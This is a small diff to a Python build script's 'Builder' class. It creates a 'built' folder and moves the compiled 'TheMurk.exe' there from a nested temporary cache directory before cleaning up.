@@ -201,10 +201,12 @@ class Builder():
             print("\033[33m{}\033[0m".format("(i) Ending..."))
             time.sleep(self.time)
             os.chdir(f'{fullPath}')
+            os.makedirs("built")
             try:
                 shutil.move(temp + os.sep + "buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
             except:
-                shutil.move(temp + os.sep + "buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
+                shutil.move(temp + os.sep + "buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath+"/built")
+
         shutil.rmtree(temp + os.sep + 'buildingCache/', ignore_errors=True)
         print("\033[33m{}\033[0m".format("(i) Done"))
         input("\033[33m{}\033[0m".format("(i) Exit on enter..."))
